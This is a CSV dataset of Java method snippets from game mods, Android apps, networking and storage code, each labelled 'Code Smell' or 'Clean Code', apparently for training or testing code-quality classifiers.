text,label,text_label
"private static int cloneBlocks(BoundingBox sourceArea,ServerLevel world,BlockPos diffToTarget){
  int blockPastes=0;
  List<StructureTemplate.StructureBlockInfo> blocks=Lists.newArrayList();
  List<StructureTemplate.StructureBlockInfo> beBlocks=Lists.newArrayList();
  for (int z=sourceArea.minZ(); z <= sourceArea.maxZ(); ++z) {
    for (int y=sourceArea.minY(); y <= sourceArea.maxY(); ++y) {
      for (int x=sourceArea.minX(); x <= sourceArea.maxX(); ++x) {
        BlockPos currentPos=new BlockPos(x,y,z);
        BlockPos newPos=currentPos.offset(diffToTarget);
        BlockInWorld cached=new BlockInWorld(world,currentPos,false);
        BlockState state=cached.getState();
        BlockEntity be=world.getBlockEntity(currentPos);
        if (be != null) {
          CompoundTag nbt=be.saveWithFullMetadata();
          beBlocks.add(new StructureTemplate.StructureBlockInfo(newPos,state,nbt));
        }
 else {
          blocks.add(new StructureTemplate.StructureBlockInfo(newPos,state,null));
        }
      }
    }
  }
  List<StructureTemplate.StructureBlockInfo> allBlocks=Lists.newArrayList();
  allBlocks.addAll(blocks);
  allBlocks.addAll(beBlocks);
  List<StructureTemplate.StructureBlockInfo> reverse=Lists.reverse(allBlocks);
  for (  StructureTemplate.StructureBlockInfo info : reverse) {
    BlockEntity be=world.getBlockEntity(info.pos());
    Clearable.tryClear(be);
    world.setBlock(info.pos(),Blocks.BARRIER.defaultBlockState(),2);
  }
  for (  StructureTemplate.StructureBlockInfo info : allBlocks) {
    if (world.setBlock(info.pos(),info.state(),2))     blockPastes++;
  }
  for (  StructureTemplate.StructureBlockInfo info : beBlocks) {
    BlockEntity be=world.getBlockEntity(info.pos());
    if (be != null && info.nbt() != null) {
      info.nbt().putInt(""x"",info.pos().getX());
      info.nbt().putInt(""y"",info.pos().getY());
      info.nbt().putInt(""z"",info.pos().getZ());
      be.load(info.nbt());
      be.setChanged();
    }
    world.setBlock(info.pos(),info.state(),2);
  }
  for (  StructureTemplate.StructureBlockInfo info : reverse) {
    world.blockUpdated(info.pos(),info.state().getBlock());
  }
  world.getBlockTicks().copyArea(sourceArea,diffToTarget);
  return blockPastes;
}",1,Code Smell
"@NonNull @Override public Resource<Bitmap> transform(@NonNull Context context,@NonNull Resource<Bitmap> resource,int outWidth,int outHeight){
  Bitmap source=resource.get();
  int finalWidth, finalHeight;
  float ratio;
  if (outWidth > outHeight) {
    ratio=(float)outHeight / (float)outWidth;
    finalWidth=source.getWidth();
    finalHeight=(int)((float)source.getWidth() * ratio);
    if (finalHeight > source.getHeight()) {
      ratio=(float)outWidth / (float)outHeight;
      finalHeight=source.getHeight();
      finalWidth=(int)((float)source.getHeight() * ratio);
    }
  }
 else   if (outWidth < outHeight) {
    ratio=(float)outWidth / (float)outHeight;
    finalHeight=source.getHeight();
    finalWidth=(int)((float)source.getHeight() * ratio);
    if (finalWidth > source.getWidth()) {
      ratio=(float)outHeight / (float)outWidth;
      finalWidth=source.getWidth();
      finalHeight=(int)((float)source.getWidth() * ratio);
    }
  }
 else {
    finalHeight=source.getHeight();
    finalWidth=finalHeight;
  }
  this.radius*=(float)finalHeight / (float)outHeight;
  Bitmap outBitmap=this.mBitmapPool.get(finalWidth,finalHeight,Bitmap.Config.ARGB_8888);
  if (outBitmap == null) {
    outBitmap=Bitmap.createBitmap(finalWidth,finalHeight,Bitmap.Config.ARGB_8888);
  }
  Canvas canvas=new Canvas(outBitmap);
  Paint paint=new Paint();
  BitmapShader shader=new BitmapShader(source,Shader.TileMode.CLAMP,Shader.TileMode.CLAMP);
  int width=(source.getWidth() - finalWidth) / 2;
  int height=(source.getHeight() - finalHeight) / 2;
  if (width != 0 || height != 0) {
    Matrix matrix=new Matrix();
    matrix.setTranslate((float)(-width),(float)(-height));
    shader.setLocalMatrix(matrix);
  }
  paint.setShader(shader);
  paint.setAntiAlias(true);
  RectF rectF=new RectF(0.0F,0.0F,(float)canvas.getWidth(),(float)canvas.getHeight());
  canvas.drawRoundRect(rectF,this.radius,this.radius,paint);
  if (exceptLeftTop) {
    canvas.drawRect(0,0,radius,radius,paint);
  }
  if (exceptRightTop) {
    canvas.drawRect(canvas.getWidth() - radius,0,radius,radius,paint);
  }
  if (exceptLeftBottom) {
    canvas.drawRect(0,canvas.getHeight() - radius,radius,canvas.getHeight(),paint);
  }
  if (exceptRightBotoom) {
    canvas.drawRect(canvas.getWidth() - radius,canvas.getHeight() - radius,canvas.getWidth(),canvas.getHeight(),paint);
  }
  return BitmapResource.obtain(outBitmap,this.mBitmapPool);
}",1,Code Smell
"@Override protected final void onCreate(@Nullable Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  if (savedInstanceState != null) {
    mStageId=savedInstanceState.getInt(KEY_STAGE_ID,IntIdGenerator.INVALID_ID);
    ArrayList<String> list=savedInstanceState.getStringArrayList(KEY_SCENE_TAG_LIST);
    if (list != null) {
      mSceneTagList.addAll(list);
      mDelaySceneTagList.addAll(list);
    }
    mIdGenerator.lazySet(savedInstanceState.getInt(KEY_NEXT_ID));
  }
  if (mStageId == IntIdGenerator.INVALID_ID) {
    ((SceneApplication)getApplicationContext()).registerStageActivity(this);
  }
 else {
    ((SceneApplication)getApplicationContext()).registerStageActivity(this,mStageId);
  }
  onCreate2(savedInstanceState);
  Intent intent=getIntent();
  if (savedInstanceState == null) {
    if (intent != null) {
      String action=intent.getAction();
      if (Intent.ACTION_MAIN.equals(action)) {
        Announcer announcer=getLaunchAnnouncer();
        if (announcer != null) {
          startScene(announcer);
          return;
        }
      }
 else       if (ACTION_START_SCENE.equals(action)) {
        if (startSceneFromIntent(intent)) {
          return;
        }
      }
    }
    onUnrecognizedIntent(intent);
  }
}",1,Code Smell
"@Override public void hook() throws Throwable {
  if (Helper.prefs.getBoolean(""switch_mainswitch"",false) && Helper.prefs.getBoolean(""switch_reddot"",false)) {
    XposedBridge.hookAllMethods(FeedsTabsFragment,""onUnReadCountLoaded"",XC_MethodReplacement.returnConstant(null));
    if (BaseFeedFollowAvatarViewHolder_setUnreadTipVisibility != null)     XposedBridge.hookMethod(BaseFeedFollowAvatarViewHolder_setUnreadTipVisibility,XC_MethodReplacement.returnConstant(null));
    if (ZHMainTabLayout_updateBadges != null)     XposedBridge.hookMethod(ZHMainTabLayout_updateBadges,XC_MethodReplacement.returnConstant(null));
    if (BottomNavMenuItemView_setUnreadCount != null)     XposedBridge.hookMethod(BottomNavMenuItemView_setUnreadCount,XC_MethodReplacement.returnConstant(null));
    if (BottomNavMenuItemViewForIconOnly_setUnreadCount != null)     XposedBridge.hookMethod(BottomNavMenuItemViewForIconOnly_setUnreadCount,XC_MethodReplacement.returnConstant(null));
    if (BaseBottomNavMenuItemView_setNavBadge != null)     XposedBridge.hookMethod(BaseBottomNavMenuItemView_setNavBadge,XC_MethodReplacement.returnConstant(null));
    XposedHelpers.findAndHookMethod(NotiMsgModel,""getUnreadCount"",XC_MethodReplacement.returnConstant(0));
    if (NotiUnreadCountKt_hasUnread != null)     XposedBridge.hookMethod(NotiUnreadCountKt_hasUnread,XC_MethodReplacement.returnConstant(false));
    if (IconWithDotAndCountView_setUnreadCount != null)     XposedBridge.hookMethod(IconWithDotAndCountView_setUnreadCount,XC_MethodReplacement.returnConstant(null));
    if (CountDotView_setUnreadCount != null)     XposedBridge.hookMethod(CountDotView_setUnreadCount,new XC_MethodReplacement(){
      @Override protected Object replaceHookedMethod(      MethodHookParam param){
        View obj=(View)param.thisObject;
        obj.setVisibility(View.GONE);
        return null;
      }
    }
);
    if (ViewModel != null) {
      XposedHelpers.findAndHookConstructor(ViewModel,View.class,new XC_MethodHook(){
        @Override protected void afterHookedMethod(        MethodHookParam param){
          try {
            ViewGroup view=(ViewGroup)param.args[0];
            if (view.getChildCount() == 2) {
              view.setVisibility(View.GONE);
            }
          }
 catch (          Throwable ignored) {
          }
        }
      }
);
    }
    if (RevisitView_getCanShowRedDot != null)     XposedBridge.hookMethod(RevisitView_getCanShowRedDot,XC_MethodReplacement.returnConstant(false));
  }
}",1,Code Smell
"@Override public CfQrCodeExample getExampleByQuery(CfQrCodeQuery cfQrCodeQuery){
  CfQrCodeExample cfQrCodeExample=new CfQrCodeExample();
  CfQrCodeExample.Criteria criteria=cfQrCodeExample.createCriteria();
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getCodeType())) {
    criteria.andCodeTypeEqualTo(cfQrCodeQuery.getCodeType());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getSourceId())) {
    criteria.andSourceIdEqualTo(cfQrCodeQuery.getSourceId());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getCreaterId())) {
    criteria.andCreaterIdEqualTo(cfQrCodeQuery.getCreaterId());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getFromUid())) {
    criteria.andFromUidEqualTo(cfQrCodeQuery.getFromUid());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getToUid())) {
    criteria.andToUidEqualTo(cfQrCodeQuery.getToUid());
  }
  if (cfQrCodeQuery.getMinCreateTime() != null) {
    criteria.andCreateTimeGreaterThanOrEqualTo(cfQrCodeQuery.getMinCreateTime());
  }
  if (cfQrCodeQuery.getMaxCreateTime() != null) {
    criteria.andCreateTimeLessThanOrEqualTo(cfQrCodeQuery.getMaxCreateTime());
  }
  if (cfQrCodeQuery.getMinEffectiveTime() != null) {
    criteria.andEffectiveTimeGreaterThanOrEqualTo(cfQrCodeQuery.getMinEffectiveTime());
  }
  if (cfQrCodeQuery.getMaxEffectiveTime() != null) {
    criteria.andEffectiveTimeLessThanOrEqualTo(cfQrCodeQuery.getMaxEffectiveTime());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getOrderBy())) {
    cfQrCodeExample.setOrderByClause(cfQrCodeQuery.getOrderBy());
  }
  if (cfQrCodeQuery.getPage() != null && cfQrCodeQuery.getSize() != null) {
    PageHelper.startPage(cfQrCodeQuery.getPage(),cfQrCodeQuery.getSize());
  }
  return cfQrCodeExample;
}
",0,Clean Code
"@Override public boolean mouseScrolled(double pMouseX,double pMouseY,double pDelta){
  if (destinationSuggestions != null && destinationSuggestions.mouseScrolled(Mth.clamp(pDelta,-1.0D,1.0D)))   return true;
  if (editingCondition != null || editingDestination != null)   return super.mouseScrolled(pMouseX,pMouseY,pDelta);
  if (hasShiftDown()) {
    List<ScheduleEntry> entries=schedule.entries;
    int y=(int)(pMouseY - topPos - 25 + scroll.getValue());
    for (int i=0; i < entries.size(); i++) {
      ScheduleEntry entry=entries.get(i);
      int maxRows=0;
      for (      List<ScheduleWaitCondition> list : entry.conditions)       maxRows=Math.max(maxRows,list.size());
      int cardHeight=CARD_HEADER + 24 + maxRows * 18;
      if (y >= cardHeight) {
        y-=cardHeight + 9;
        if (y < 0)         break;
        continue;
      }
      if (!isConditionAreaScrollable(entry))       break;
      if (y < 24)       break;
      if (pMouseX < leftPos + 25)       break;
      if (pMouseX > leftPos + 205)       break;
      float chaseTarget=horizontalScrolls.get(i).getChaseTarget();
      if (pDelta > 0 && !Mth.equal(chaseTarget,0)) {
        horizontalScrolls.get(i).chase(chaseTarget - 1,0.5f,Chaser.EXP);
        return true;
      }
      if (pDelta < 0 && !Mth.equal(chaseTarget,entry.conditions.size() - 1)) {
        horizontalScrolls.get(i).chase(chaseTarget + 1,0.5f,Chaser.EXP);
        return true;
      }
      return false;
    }
  }
  float chaseTarget=scroll.getChaseTarget();
  float max=40 - 173;
  for (  ScheduleEntry scheduleEntry : schedule.entries) {
    int maxRows=0;
    for (    List<ScheduleWaitCondition> list : scheduleEntry.conditions)     maxRows=Math.max(maxRows,list.size());
    max+=CARD_HEADER + 24 + maxRows * 18 + 10;
  }
  if (max > 0) {
    chaseTarget-=pDelta * 12;
    chaseTarget=Mth.clamp(chaseTarget,0,max);
    scroll.chase((int)chaseTarget,0.7f,Chaser.EXP);
  }
 else   scroll.chase(0,0.7f,Chaser.EXP);
  return super.mouseScrolled(pMouseX,pMouseY,pDelta);
}",1,Code Smell
"@Override protected void decode(ChannelHandlerContext ctx,ByteBuf buffer,List<Object> out) throws Exception {
  buffer.markReaderIndex();
  int totalLen=buffer.readInt();
  LOGGER.debug(""decode totalLen : {}"",totalLen);
  if (totalLen != buffer.readableBytes()) {
    LOGGER.error(""totalLen is not equal readableBytes.total:"" + totalLen + "";readableBytes:""+ buffer.readableBytes());
    buffer.resetReaderIndex();
    throw new Exception(""totalLen is not equal readableBytes.total"");
  }
  int msgType=buffer.readByte() & 0x1f;
  if (msgType == 4) {
    LOGGER.info(""debug decode"");
  }
  if (msgType == 3 | msgType == 5) {
    int bodyLength=buffer.readInt();
    if (bodyLength >= totalLen) {
      LOGGER.error(""bodyLen is greater than totalLen.totalLen:"" + totalLen + "";bodyLen:""+ bodyLength);
      buffer.resetReaderIndex();
      throw new Exception(""bodyLen is greater than totalLen.totalLen"");
    }
    byte[] bodyBytes=null;
    if (bodyLength > 0) {
      bodyBytes=new byte[bodyLength];
      buffer.readBytes(bodyBytes);
    }
    int attrLength=buffer.readInt();
    byte[] attrBytes=null;
    if (attrLength > 0) {
      attrBytes=new byte[attrLength];
      buffer.readBytes(attrBytes);
    }
    EncodeObject object=new EncodeObject(bodyBytes,new String(attrBytes,StandardCharsets.UTF_8));
    object.setMsgtype(5);
    out.add(object);
  }
 else   if (msgType == 7) {
    int seqId=buffer.readInt();
    int attrLen=buffer.readShort();
    byte[] attrBytes=null;
    if (attrLen > 0) {
      attrBytes=new byte[attrLen];
      buffer.readBytes(attrBytes);
    }
    EncodeObject object=new EncodeObject(new String(attrBytes,StandardCharsets.UTF_8));
    object.setMessageId(String.valueOf(seqId));
    buffer.readShort();
    object.setMsgtype(msgType);
    out.add(object);
  }
 else   if (msgType == 8) {
    buffer.skipBytes(4 + 1 + 4);
    final short load=buffer.readShort();
    int attrLen=buffer.readShort();
    byte[] attrBytes=null;
    if (attrLen > 0) {
      attrBytes=new byte[attrLen];
      buffer.readBytes(attrBytes);
    }
    buffer.skipBytes(2);
    String attrs=(attrBytes == null ? """" : new String(attrBytes,StandardCharsets.UTF_8));
    EncodeObject object=new EncodeObject(attrs);
    object.setMsgtype(8);
    object.setLoad(load);
    out.add(object);
  }
}",1,Code Smell
"@Override public boolean onOptionsItemSelected(@NonNull MenuItem item){
  int id=item.getItemId();
  if (id == R.id.action_refresh) {
    mModel.reload();
    return true;
  }
 else   if (id == R.id.action_shortcut) {
    Uri uri=mPathListAdapter.getCurrentUri();
    if (uri != null) {
      mModel.createShortcut(uri);
    }
    return true;
  }
 else   if (id == R.id.action_storage) {
    ThreadUtils.postOnBackgroundThread(() -> {
      ArrayMap<String,Uri> storageLocations=StorageUtils.getAllStorageLocations(mActivity);
      if (storageLocations.size() == 0) {
        mActivity.runOnUiThread(() -> {
          if (isDetached())           return;
          new MaterialAlertDialogBuilder(mActivity).setTitle(R.string.storage).setMessage(R.string.no_volumes_found).setNegativeButton(R.string.ok,null).show();
        }
);
        return;
      }
      Uri[] backupVolumes=new Uri[storageLocations.size()];
      CharSequence[] backupVolumesStr=new CharSequence[storageLocations.size()];
      for (int i=0; i < storageLocations.size(); ++i) {
        backupVolumes[i]=storageLocations.valueAt(i);
        backupVolumesStr[i]=new SpannableStringBuilder(storageLocations.keyAt(i)).append(""\n"").append(getSecondaryText(mActivity,getSmallerText(backupVolumes[i].getPath())));
      }
      mActivity.runOnUiThread(() -> {
        if (isDetached())         return;
        new SearchableItemsDialogBuilder<>(mActivity,backupVolumesStr).setTitle(R.string.storage).setOnItemClickListener((dialog,which,item1) -> {
          mModel.loadFiles(backupVolumes[which]);
          dialog.dismiss();
        }
).setNegativeButton(R.string.cancel,null).show();
      }
);
    }
);
    return true;
  }
 else   if (id == R.id.action_list_options) {
    FmListOptions listOptions=new FmListOptions();
    listOptions.setListOptionActions(mModel);
    listOptions.show(getChildFragmentManager(),FmListOptions.TAG);
    return true;
  }
 else   if (id == R.id.action_paste) {
    FmTasks.FmTask task=FmTasks.getInstance().dequeue();
    if (task != null) {
      startBatchPaste(task);
    }
    return true;
  }
 else   if (id == R.id.action_new_window) {
    Intent intent=new Intent(mActivity,FmActivity.class);
    if (!mModel.getOptions().isVfs) {
      intent.setDataAndType(mModel.getCurrentUri(),DocumentsContract.Document.MIME_TYPE_DIR);
    }
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
    startActivity(intent);
    return true;
  }
 else   if (id == R.id.action_settings) {
    Intent intent=SettingsActivity.getIntent(requireContext(),""files_prefs"");
    startActivity(intent);
    return true;
  }
  return super.onOptionsItemSelected(item);
}",0,Clean Code
"/** 
 * Check all components that needs to be disabled/enabled and assign to be disabled/enabled if necessary.
 */
public int invalidateComponents(){
  int invalidated=0;
  boolean canCheckExistence=mComponents != null;
  List<ComponentRule> allEntries=getAllComponents();
  for (  ComponentRule entry : allEntries) {
    if (canCheckExistence && !mComponents.contains(entry.name)) {
      removeEntry(entry);
      ++invalidated;
      continue;
    }
    try {
      int s=PackageManagerCompat.getComponentEnabledSetting(new ComponentName(entry.packageName,entry.name),userId);
switch (entry.getComponentStatus()) {
case ComponentRule.COMPONENT_BLOCKED_IFW_DISABLE:
case ComponentRule.COMPONENT_DISABLED:
        if (s == PackageManager.COMPONENT_ENABLED_STATE_ENABLED || s == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT) {
          addComponent(entry.name,entry.type,entry.getToBe());
          ++invalidated;
        }
      break;
case ComponentRule.COMPONENT_ENABLED:
    if (s != PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
      addComponent(entry.name,entry.type,entry.getToBe());
      ++invalidated;
    }
  break;
}
}
 catch (Throwable ignore) {
}
}
return invalidated;
}",1,Code Smell
"private int readLastScrValue(ExtractorInput input,PositionHolder seekPositionHolder) throws IOException, InterruptedException {
  long inputLength=input.getLength();
  int bytesToSearch=(int)Math.min(TIMESTAMP_SEARCH_BYTES,inputLength);
  long searchStartPosition=inputLength - bytesToSearch;
  if (input.getPosition() != searchStartPosition) {
    seekPositionHolder.position=searchStartPosition;
    return Extractor.RESULT_SEEK;
  }
  packetBuffer.reset(bytesToSearch);
  input.resetPeekPosition();
  input.peekFully(packetBuffer.data,0,bytesToSearch);
  lastScrValue=readLastScrValueFromBuffer(packetBuffer);
  isLastScrValueRead=true;
  return Extractor.RESULT_CONTINUE;
}",0,Clean Code
"public static String processProxyListFile(Context ctx,File proxyListFile){
  try {
    if (proxyListFile.length() > 2 * 1024 * 1024L) {
      throw new IllegalArgumentException(""file too large."");
    }
    JSONObject proxyRootObject=new JSONObject(FileUtil.readUtf8String(proxyListFile));
    int version=proxyRootObject.optInt(""nekox_proxy_list_version"",1);
    if (version == 1) {
      if (proxyRootObject.isNull(""proxies"")) {
        throw new IllegalArgumentException(""proxies array not found."");
      }
      JSONArray proxyArray=proxyRootObject.getJSONArray(""proxies"");
      if (proxyArray.length() == 0) {
        throw new IllegalArgumentException(""Empty proxy list."");
      }
      LinkedList<String> imported=new LinkedList<>();
      LinkedHashMap<String,String> errors=new LinkedHashMap<>();
      for (int index=0; index < proxyArray.length(); index++) {
        String proxyUrl=proxyArray.getString(index);
        try {
          imported.add(ProxyUtil.importInBackground(proxyUrl).getTitle());
        }
 catch (        Exception ex) {
          errors.put(proxyUrl.length() < 15 ? proxyUrl : (proxyUrl.substring(0,15) + ""...""),ex.getMessage());
        }
      }
      StringBuilder status=new StringBuilder();
      if (!imported.isEmpty()) {
        status.append(LocaleController.getString(""ImportedProxies"",R.string.ImportedProxies));
        for (        String success : imported) {
          status.append(""\n"").append(success);
        }
        if (!errors.isEmpty()) {
          status.append(""\n\n"");
        }
      }
      if (!errors.isEmpty()) {
        status.append(LocaleController.getString(""ErrorsInImport"",R.string.ErrorsInImport));
        for (        Map.Entry<String,String> error : errors.entrySet()) {
          status.append(""\n"").append(error.getKey()).append("": "").append(error.getValue());
        }
      }
      if (imported.isEmpty()) {
        AlertUtil.showSimpleAlert(ctx,status.toString());
      }
 else {
        return status.toString();
      }
    }
 else {
      throw new IllegalArgumentException(""invalid proxy list version "" + version + ""."");
    }
  }
 catch (  Exception e) {
    AlertUtil.showSimpleAlert(ctx,LocaleController.getString(""InvalidProxyFile"",R.string.InvalidProxyFile) + proxyListFile.getPath() + ""\n\n""+ e.getMessage());
  }
  return null;
}",1,Code Smell
"/** 
 * execute watch event
 */
private synchronized void watchIfNecessary() throws PluginLifeCycleException {
  if (watched.compareAndSet(false,true)) {
    List<EnhanceModel> enhanceModels=getEnhanceModels();
    if (CollectionUtils.isEmpty(enhanceModels)) {
      throw new PluginLifeCycleException(""enhance models is empty, plugin type is "" + identity());
    }
    for (    EnhanceModel em : enhanceModels) {
      EventWatchBuilder.IBuildingForBehavior behavior=null;
      EventWatchBuilder.IBuildingForClass builder4Class=new EventWatchBuilder(watcher).onClass(em.getClassPattern());
      builder4Class.isIncludeBootstrap(em.isIncludeBootstrap());
      if (em.isIncludeSubClasses()) {
        builder4Class=builder4Class.includeSubClasses();
      }
      for (      EnhanceModel.MethodPattern mp : em.getMethodPatterns()) {
        behavior=builder4Class.onBehavior(mp.getMethodName());
        if (ArrayUtils.isNotEmpty(mp.getParameterType())) {
          behavior.withParameterTypes(mp.getParameterType());
        }
        if (ArrayUtils.isNotEmpty(mp.getAnnotationTypes())) {
          behavior.hasAnnotationTypes(mp.getAnnotationTypes());
        }
      }
      if (behavior != null) {
        int watchId=behavior.onWatch(getEventListener(listener),em.getWatchTypes()).getWatchId();
        watchIds.add(watchId);
        log.info(""add watcher success,type={},watcherId={}"",getType().name(),watchId);
      }
    }
  }
}",1,Code Smell
"/** 
 * Query group's offset records stored in broker.
 * @param msgStore       history offset store
 * @param groupName      group name
 * @param requestOffset  request offset
 * @param recordStamp    record timestamp
 * @param msgCount       at most record count
 * @param maxRetryCnt    max query turns
 * @param strBuff        string buffer
 */
private void queryGroupStoredOffsets(MessageStore msgStore,String groupName,long requestOffset,long recordStamp,int msgCount,int maxRetryCnt,StringBuilder strBuff){
  int msgTypeCode;
  int partitionId;
  int msgAccCnt=0;
  boolean msgMatched;
  Throwable qryThrow;
  GetMessageResult getMessageResult;
  msgTypeCode=groupName.hashCode();
  partitionId=Math.abs(msgTypeCode) % TServerConstants.OFFSET_HISTORY_NUMPARTS;
  Set<String> filterCodes=new HashSet<>();
  filterCodes.add(groupName);
  ConsumerNodeInfo consumerNodeInfo=new ConsumerNodeInfo(broker.getStoreManager(),groupName,""offsetConsumer"",filterCodes,"""",System.currentTimeMillis(),"""","""");
  int qryRetryCount=0;
  long itemInitOffset=requestOffset;
  int maxTransferSize=broker.getStoreManager().getMaxMsgTransferSize();
  do {
    qryThrow=null;
    try {
      getMessageResult=msgStore.getMessages(303,itemInitOffset,partitionId,consumerNodeInfo,TServerConstants.OFFSET_HISTORY_NAME,maxTransferSize,recordStamp);
    }
 catch (    Throwable e2) {
      qryThrow=e2;
      continue;
    }
    if (getMessageResult.transferedMessageList == null || getMessageResult.transferedMessageList.isEmpty()) {
      itemInitOffset+=getMessageResult.lastReadOffset;
      continue;
    }
    msgMatched=false;
    List<Message> messageList=DataConverterUtil.convertMessage(TServerConstants.OFFSET_HISTORY_NAME,getMessageResult.transferedMessageList);
    for (    Message message : messageList) {
      if (message == null) {
        continue;
      }
      if (!groupName.equals(message.getAttrValue(TServerConstants.TOKEN_OFFSET_GROUP))) {
        continue;
      }
      msgMatched=true;
      if (msgAccCnt++ == 0) {
        strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":true,\""errMsg\"":\""ok\"",\""records\"":["").append(StringUtils.newStringUtf8(message.getData()));
      }
 else {
        strBuff.append("","").append(StringUtils.newStringUtf8(message.getData()));
      }
      if (msgAccCnt >= msgCount) {
        break;
      }
    }
    if (msgMatched) {
      break;
    }
    itemInitOffset+=getMessageResult.lastReadOffset;
  }
 while (++qryRetryCount < maxRetryCnt);
  if (msgAccCnt > 0) {
    strBuff.append(""],\""recordCount\"":"").append(msgAccCnt).append(""}"");
  }
 else {
    if (qryThrow == null) {
      strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":false,\""errMsg\"":\""Could not find record!\""}"");
    }
 else {
      strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":false,\""errMsg\"":\""Get Message failure: "").append(qryThrow.getMessage()).append(""\""}"");
    }
  }
}",1,Code Smell
"/** 
 * Trying to filter languages preferred by the user
 */
private MediaTrack[][] filterByLanguage(MediaTrack[][] trackGroupList,MediaTrack originTrack){
  if (!(originTrack instanceof AudioTrack) || trackGroupList.length <= 1) {
    return trackGroupList;
  }
  String audioLanguage=PlayerData.instance(mContext).getAudioLanguage();
  String resultLanguage=null;
  String originLanguage=null;
  if (!TextUtils.isEmpty(audioLanguage) && originTrack.isSaved) {
    resultLanguage=audioLanguage;
  }
  if (originTrack.format != null && !TextUtils.isEmpty(originTrack.format.language)) {
    originLanguage=originTrack.format.language;
  }
  if (resultLanguage == null && originLanguage == null) {
    return trackGroupList;
  }
  List<MediaTrack[]> resultTracks=null;
  List<MediaTrack[]> originTracks=null;
  List<MediaTrack[]> resultTracksFallback=null;
  for (  MediaTrack[] trackGroup : trackGroupList) {
    if (trackGroup != null && trackGroup.length >= 1) {
      MediaTrack mediaTrack=trackGroup[0];
      if (mediaTrack != null && mediaTrack.format != null) {
        if (Helpers.startsWith(mediaTrack.format.language,resultLanguage)) {
          if (resultTracks == null) {
            resultTracks=new ArrayList<>();
          }
          resultTracks.add(trackGroup);
        }
 else         if (Helpers.startsWith(mediaTrack.format.language,originLanguage)) {
          if (originTracks == null) {
            originTracks=new ArrayList<>();
          }
          originTracks.add(trackGroup);
        }
 else         if (Helpers.startsWith(mediaTrack.format.language,DEFAULT_LANGUAGE)) {
          if (resultTracksFallback == null) {
            resultTracksFallback=new ArrayList<>();
          }
          resultTracksFallback.add(trackGroup);
        }
      }
    }
  }
  if (resultTracks != null && !resultTracks.isEmpty()) {
    return resultTracks.toArray(new MediaTrack[0][]);
  }
  if (originTracks != null && !originTracks.isEmpty()) {
    return originTracks.toArray(new MediaTrack[0][]);
  }
  if (resultTracksFallback != null && !resultTracksFallback.isEmpty()) {
    return resultTracksFallback.toArray(new MediaTrack[0][]);
  }
  return trackGroupList;
}",1,Code Smell
"private void reduceCraftingGrid(boolean makeAll){
  if (gridSize == -1)   return;
  int crafted;
  if (!makeAll) {
    crafted=1;
  }
 else {
    crafted=0;
    for (int i=0; i < gridSize; i++) {
      GeyserItemStack item=getItem(i + 1);
      if (!item.isEmpty()) {
        if (crafted == 0) {
          crafted=item.getAmount();
        }
        crafted=Math.min(crafted,item.getAmount());
      }
    }
  }
  for (int i=0; i < gridSize; i++) {
    final int slot=i + 1;
    GeyserItemStack item=getItem(slot);
    if (!item.isEmpty()) {
      sub(slot,item,crafted);
    }
  }
}",1,Code Smell
